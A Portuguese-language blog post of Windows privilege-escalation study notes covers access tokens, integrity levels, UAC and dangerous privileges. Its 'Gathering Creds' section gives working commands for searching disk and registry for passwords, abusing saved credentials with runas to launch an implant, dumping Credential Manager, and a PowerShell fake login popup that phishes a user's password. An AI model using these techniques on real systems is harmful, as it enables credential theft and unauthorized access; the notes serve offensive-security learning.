<!doctype html> <html lang=""> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> windows priv-esc pt1 | Geleia </title> <meta name="author" content="Geleia "> <meta name="description" content="serie de windows Priv-Esc"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://geleiaa.github.io/blog/2024/winprivesc_pt1/"> <script src="/assets/js/theme.js?a5ca4084d3b81624bcfa01156dae2b8e"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>initTheme();</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Geleia</span> </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">windows priv-esc pt1</h1> <p class="post-meta"> May 10, 2024 </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a> &nbsp; &middot; &nbsp; <a href="/blog/category/windows"> <i class="fa-solid fa-tag fa-sm"></i> windows</a> &nbsp; <a href="/blog/category/bhatagem"> <i class="fa-solid fa-tag fa-sm"></i> bhatagem</a> &nbsp; </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="windows-lpe-notes">Windows LPE notes…</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Pri-esc base:
  1. Pegar SYSTEM perm
  2. Assumir outro usuário
  3. Mudar integrity levels
  4. Tirar proveito de tokens
  5. Ganhar mais privilégios  
</code></pre></div></div> <ul> <li> <p>De um lado temos os resources do sistema como arquivos, diretórios ou registries. E ous outros são usuários/process que desejam utilizar esses recursos…</p> </li> <li> <p>Entre resouces e process temos a divisão do sistema em que os process podem acessar qual recurso … Como o acesso aos recursos é concedido ou negado ?? Então quando um resource possui o <code class="language-plaintext highlighter-rouge">SECURITY DESCRIPTOR</code> que é composto por <code class="language-plaintext highlighter-rouge">OWNER</code>, <code class="language-plaintext highlighter-rouge">GROUP</code> e <code class="language-plaintext highlighter-rouge">ACLs</code> que descrevem quem pode ou não acessar os resources. Por outro lado, os process usam tokens de acesso que são objects dedicados que descrevem a identidade do usuário. E o <code class="language-plaintext highlighter-rouge">SECURITY REFERENCE MONITOR</code> no Kernel verifica até mesmo a call de um process específico para um acesso específico é permitida ou não. Primeiro é verificado o <code class="language-plaintext highlighter-rouge">INTEGRITY LEVEL</code> depois é verificado o OWNER e a ACL do resource.</p> </li> <li>O process e os threads herdam um token dos parent process. Os Tokens de Acesso são a base de todas as autorizações ou “decisões” no sistema, concedidas ao usuário autorizado pelo LASS. Cada token de acesso inclui o <code class="language-plaintext highlighter-rouge">CID</code> dos usuários.</li> <li><code class="language-plaintext highlighter-rouge">Primary Tokens</code> = default security information of process or thread.</li> <li> <p><code class="language-plaintext highlighter-rouge">Impersonation Tokens</code> = permite realizar operações utilizando token de acesso de outro usuário.</p> </li> <li><code class="language-plaintext highlighter-rouge">PRIVILEGIES</code> e <code class="language-plaintext highlighter-rouge">ACCESS RIGHTS</code> tem duas diferenças principais: Privilegies controlam o acesso a tarefas relacionadas ao sistema e Access Rights controlam o acesso a objects. A segunda diferença é que os Privilegies são atribuídos a contas de usuário/grupo e os Access Rights atribuídos a ACLs de objetos.</li> </ul> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Privilegies:
  - Atribuido a users e groups
  - operações no sistema:
    - instalar/carregar drives
    - shutdown
    - mudar timezone


- Access Rights:
  - Atrbuido a Objects ACL
  - Acessar Objects protegidos:
    - arquivos/pastas, registry keys, services, network shares, access tokens...
</code></pre></div></div> <ul> <li> <p>O <code class="language-plaintext highlighter-rouge">User Access control</code> (UAC) é um componente fundamental da visão geral de segurança da MS. O UAC ajuda a mitigar o impacto de malwares. Cada aplicativo que requer o administrator access token deve solicitar-lo. A única exceção é o relacionamento que existe entre <code class="language-plaintext highlighter-rouge">parent processes</code>. Os <code class="language-plaintext highlighter-rouge">Child Processes</code> herdam o acess token do <code class="language-plaintext highlighter-rouge">parent process</code>. Entretanto, os parents e child process devem ter o mesmo <code class="language-plaintext highlighter-rouge">Integrity Level</code>. O Windows protege processes marcando seus integrity levels. Os Integrity Levels são medidas de confiança. Um programa integrity “alta” é aquele que executa tarefas que modificam dados do sistema, como um programa de particionamento de disco, enquanto um programa de integrity “baixa” é aquele que executa tarefas que podem comprometer o sistema operacional, como um navegador da Web. Programas com integrity level mais baixos não podem modificar dados em programas com integrity levels mais altos. Quando um usuário padrão tenta executar um programa que requer um access token de administrator, o UAC exige que o usuário forneça credenciais de administrador válidas.</p> </li> <li>Integrity Level <ul> <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels</a></li> </ul> </li> <li>Filtered Admin Token or Restricted Access Token <ul> <li><a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e">https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens">https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens</a></li> </ul> </li> <li>Permissões “perigosas”? <ul> <li><code class="language-plaintext highlighter-rouge">SeBackupPriv</code> - read qualquer arquivo</li> <li><code class="language-plaintext highlighter-rouge">SeRestorePriv</code> - write em qualquer arquivo</li> <li><code class="language-plaintext highlighter-rouge">SeTakeOwnershipPriv</code> - se tornar owner</li> <li><code class="language-plaintext highlighter-rouge">SeTcbPriv</code> - se tornar parte do TCB</li> <li><code class="language-plaintext highlighter-rouge">SeLoadDriverPriv</code> - load/unload drivers</li> <li><code class="language-plaintext highlighter-rouge">SeCreateTokenPriv</code> - criar primary token</li> <li><code class="language-plaintext highlighter-rouge">SeImpersonatePriv</code> - se tornar outro user</li> <li><code class="language-plaintext highlighter-rouge">SeDebugPriv</code> - acessar a memória de qualquer process</li> </ul> </li> </ul> <h4 id="readrefs">READ/REFS</h4> <ul> <li><a href="https://www.pwndefend.com/2021/08/18/windows-security-fundamentals-lpe/">https://www.pwndefend.com/2021/08/18/windows-security-fundamentals-lpe/</a></li> <li><a href="https://dmfrsecurity.com/2021/05/16/review-red-team-operator-privilege-escalation-in-windows-course-by-sektor7-institute/">https://dmfrsecurity.com/2021/05/16/review-red-team-operator-privilege-escalation-in-windows-course-by-sektor7-institute/</a></li> </ul> <blockquote> <hr/> </blockquote> <h2 id="gathering-creds">Gathering Creds</h2> <h3 id="procurando-senhas-em-plaintext">Procurando senhas em plaintext</h3> <ul> <li>lista todos os diretorios a partir do c:\</li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; dir /b /a /s c:\ &gt; output.txt</code> <ul> <li>em um cenário real você faz download do arquivo para a attack machine e analisa “offline”</li> </ul> </li> <li>Filtra por arquivos com nome “passw”</li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; type output.txt | findstr /i passw</code></li> </ul> <p>https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples</p> <h3 id="nomes-e-extenções-de-arquivos-interessantes-para-verificar">Nomes e Extenções de arquivos interessantes para verificar</h3> <ul> <li> <p>Extenções: install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .conf, ,ini, .xml, .txt, .gpg, .pgp, .p12, .der, .crs, .cer, id_rsa, id_dsa, .ovpn, vnc, ftp, ssh, vpn, git, .kdbx, .db</p> </li> <li> <p>Arquivos: unattend.xml, Unattended.xml, sysprep.inf, sysprep.xml, VARIABLES.DAT, setupinfo, setupinfo.bak, web.config, SiteList.xml, .aws\credentials, .azure\accessTokens,json, .azure\azureProfile.json, gcloud\credentials.db, gcloud\legacy_credentials, gcloud\access_tokens.db</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; type output.txt | findstr /i algumas extenção</code></p> </li> </ul> <h3 id="arquivos-nos-registries">Arquivos nos Registries</h3> <ul> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\ORL\WinVNC3\Passowrd"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\TightVNC\Server"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\SimonTatham\PuTTY\Sessions"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\SimonTatham\PuTTY\Sessions\local"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query HKLM /f password /c REG_SZ /s</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query HKLM /f password /c REG_SZ /s</code></p> </li> </ul> <h3 id="abusing-credential-manager">Abusing Credential Manager</h3> <ul> <li>Credential Manager <ul> <li>O Credential Manager é uma espécie de cofre digital dentro do sistema Windows. O Windows armazena credenciais de registry, como usernames e senhas…</li> </ul> </li> <li> <p>Do ponto de vista do invasor, geralmente você não tem acesso a uma GUI… Então você usa a linha de comando. Na linha de comando existe uma ferramenta chamada “cmdkey”.</p> <ul> <li>O cmdkey também permite listar essas informações. <ul> <li><code class="language-plaintext highlighter-rouge">C:\&gt; cmdkey /list</code></li> </ul> </li> </ul> </li> <li>We can access actualy the Admin home directory and run processes as Admin: <ul> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; runas /user:admin cmd.exe</code> &lt;===== precisa de admin pass</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; runas /savedcred /user:admin cmd.exe</code></p> <ul> <li>windows vai até Credential Manager, verifica o usuário admin (consulta o banco de dados), extrai a senha do usuário admin e executa o processo. (execute como administrador com integrity level medium)</li> </ul> </li> </ul> </li> <li>Podemos listar todos os diretórios aos quais não temos acesso. <ul> <li><code class="language-plaintext highlighter-rouge">C:\&gt; runas /savedcred /user:admin "c:\windows\system32\cmd.exe /c dir /b /a /s c:\users\admin &gt; c:\output-admin.txt"</code> <ul> <li>em um cenário real você faz download do arquivo para a attack machine e analisa “offline”</li> </ul> </li> </ul> </li> <li>Também podemos usar esse comando para rodar um implant: <ul> <li><code class="language-plaintext highlighter-rouge">C:\&gt; runas /savedcred /user:admin "c:\path\to\implant.exe"</code></li> </ul> </li> </ul> <h3 id="extraindo-creds-do-credential-manager">Extraindo creds do Credential Manager</h3> <ul> <li> <p>Script from Empire…</p> </li> <li> <p>C:&gt; powershell import-module c:\path\to\cms.ps1 ; Enum-Creds</p> </li> </ul> <h3 id="popup-local-para-pegar-as-creds-de-um-user">Popup local para pegar as creds de um user</h3> <ul> <li> <p>Cria um popup que pede a senha do usuário atual</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::Username,[Environment]::UserDomainName); $cred.getnetworkcredential().password"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'CHANGE THIS WITH OTHER USERNAME',[Environment]::UserDomainName); $cred.getnetworkcredential().password"</code></p> </li> </ul> <p>Links adicionais:</p> <ul> <li><a href="https://fuzzysecurity.com/tutorials/16.html">https://fuzzysecurity.com/tutorials/16.html</a></li> <li><a href="https://xz.aliyun.com/t/3618">https://xz.aliyun.com/t/3618</a></li> </ul> <blockquote> <hr/> </blockquote> </div> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> 2024 Geleia . </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?b7816bd189846d29eded8745f9c4cf77"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>